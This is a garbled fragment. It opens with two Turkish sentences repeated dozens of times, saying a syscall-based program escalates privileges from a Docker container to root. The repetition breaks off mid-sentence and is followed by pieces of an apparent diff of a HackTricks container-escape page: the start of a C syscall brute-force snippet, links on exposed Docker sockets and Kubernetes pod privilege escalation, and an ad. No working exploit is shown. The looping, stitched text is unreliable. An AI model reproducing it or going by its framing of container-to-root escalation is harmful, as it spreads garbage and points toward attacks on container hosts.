bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını elde etmek için syscall kullanır. Bu yöntem, bir Docker konteynerindeki sınırlı ayrıcalıkları genişletmek için kullanılabilir. Bu program, hedef sistemde root ayrıcalıklarını
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -650,7 +628,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
